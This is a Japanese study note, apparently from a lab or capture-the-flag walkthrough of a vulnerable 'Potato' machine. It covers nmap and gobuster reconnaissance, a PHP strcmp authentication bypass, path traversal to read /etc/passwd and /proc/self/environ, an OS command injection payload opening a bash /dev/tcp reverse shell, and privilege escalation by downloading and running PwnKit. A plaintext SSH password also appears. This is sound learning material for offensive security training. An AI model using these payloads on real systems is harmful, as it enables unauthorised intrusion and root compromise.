1. `fping -aqg 192.168.56.0/16`だと何が異なる
2. アドレスを環境変数でなく、シェル変数を使うこともできる?
5. nmapでwarning出てるが何か
6. nmapで80ポートのhttpd,2112ポートのproftpdの最後のdは何か
8. proftpdの他にftpサービスは何がある
9. proftpdをmetasploitでバージョンを調べる方法は
10. ftpのコマンド一覧を見る方法は
11. ssh-hostkey
12. webのソースコードを見るコマンドは
13. /.hta,./htaccess
14. /dirb/は本来何で使われていたか
15. /dirb/にあるファイルとrockyou.txtはどう違う
16. /dirb/にある各ファイルの単語の数を降順で並べる
17. index.php.bakにある、$_POST['username']のはどこからくるか
18. Gobusterの/adminのstatusが301になっているがなぜか
19. index.php.bakにあるsetcookie()は何をしている
20. index.php.bakには脆弱性があるが、いくつあるかChatGPTで調べる
21. ../../../../../etc/passwdはなぜ見れるか
22. curlコマンドを使って、passwdを見る
23. passwdのユーザには7つのフィールドがあるが左から何か
24. grep -Pの-Pは何
25. BurpのRepeaterでCPUのバージョンや環境変数、ホストファイルを見る
26. Burpのリクエストに出てくるacceptの3つは何
27. /proc/は何
28. sshサーバから送られてくるfingerprintとは何か
29. **c2(c&cまたはcommand&control)とは**
30. OSのバージョンを調べる
31. ソケットの使用状況を調べる
32. passwordという単語を含んだfileを探す
33. ホームディレクトリでのls属性を左から説明する
34. ユーザのfingerprintはどこにあるか
35. ユーザのuser.txtには何が書いてある
36. ユーザのuser.txtの次に見るべき大事なファイルは
37. サーバの公開鍵はどこにある
38. /notesディレクトリのコマンドを実行してみる
39. webサイトのhtmlはどこにあるか
40. niceコマンドをマニュアルでみる
41. niceをGTFOBinsでやってみる
42. サーバの公開鍵からfingerprintはどうやって作られる?

- 始める前にスナップショットをとる

## sshのParrot側のポートは何?
- まずPotatoにsshで接続する
- `ssh webadmin@$IP` Password:dragon
- `ss -tnp | grep :22` または `netstat -ant | grep :22`
- Peer Address:Portと書いてあるとこ

## pkexecをする
- 前回の続きでsshの接続してあるのを前提
- Parrot側でPwnKitのあるとこでサーバを起動する
  - `python -m http.server 8080`
- Potato側でPwnKitを取得する
  - `wget http://Parrotのアドレス:8080/PwnKit`
- ファイルを実行してrootになる
  - `chmod +x PwnKit`
  - `./PwnKit`     

## curl /etc/passwd
- `curl -X POST -b "pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh" -d "file=../../../../../etc/passwd"  "http://$IP/admin/dashboard.php?page=log"`

## ダッシュボードでburpでreverse-shellをする
- ダッシュボードのlogのコードはshell_exec関数を使っているので、osコマンンドインジェクションを利用してreverse-shellをできるんではないかと考える。
- `nc -nlvp 9001`をParrotで待ち受ける
- burpでrequestを以下のように書き換える
- ~`file=log_03.txt;bash -c 'exec bash -i &>/dev/tcp/192.168.56.?/9001 <&1`~
- URLEncode version
  - `file=log_03.txt;bash+-c+%27exec+bash+-i+%26%3E%2Fdev%2Ftcp%2F192.168.56.104%2F9001+%3C%261%27`
- www-dataが返ってくる

## networkとhost部を分けてfpingする
- /24は2^8=256で192.168.56.0~255を検索する
- /25は2^7=128で192.168.56.0~127を検索する
- `time sudo fping -aqg ~`で比較してみる

## PHP言語のstrcmp関数
- ここで使っているバージョンは5.6で現在の8.0ではエラーが出る
```php
<?php
# 1 -> True
if ( NULL == 0){
    echo "True";
} 

# 2 -> 0
echo strcmp("potato", "potato");

# 3 -> True
if ( strcmp([], "potato") == 0){
    echo "True";
} 
?>
```

## BurpSuiteのRepeaterの利用
- show log:のところまで行って、get the logのところで`intercept on`にしてlog_01.txtを選んでボタンを押す
- BurpにRequestが出てくる。ここで右クリックして`send to repeater`を選択する。これはデータをリピートして送ることができる。
- 初めに`file=../etc/passwd`と書いてSendする。
- 右側のResponseを見ると、どうも同じサイトに戻ってきた感じ
- `file=../../etc/passwd`を書く。また同じ何もない`../`これを順に増やしていく
- `../`が５つの時にpasswdが出てくるのでコピーする


## ../../etc/passwdが見れる理由
- /dashboard.phpに以下のコードがある。本来は`cat logs/log_01.txt`のように実行されるが、ここを書き換えて`cat logs/../../../../../etc/passwd`にしている
```
if(isset($_POST['file'])){
  echo "Contenu du fichier " . $_POST['file'] .  " :  </br>";
  echo ("<PRE>" . shell_exec("cat logs/" .  $_POST['file']) . "</PRE>");
}
```

## /drib/のファイルを並べる
- `wc -l dirb/* 2> /dev/null | sort`

## ssh-hostkey
### 設定ファイル
- クライアント
  - id_rsa, id_rsa.pub
  - known_hosts
  - /etc/ssh_config
- サーバ  
  - authorized_keys
  - /etc/sshd_config

- https://qiita.com/szly/items/54885a0594f29985d0c5

## BurpのRepeaterで環境変数やhosts,cpuinfoを見る
- ../../../../../etc/hosts
- ../../../../../proc/cpuinfo
- ../../../../../proc/self/environ

## fingerprintの作り方
- サーバの公開鍵から作ったfingerprintとクライアントのknown_hostsの中身は同じになる
- `ssh-keygen -l -f /etc/ssh/ssh_host_ecdsa_key.pub`
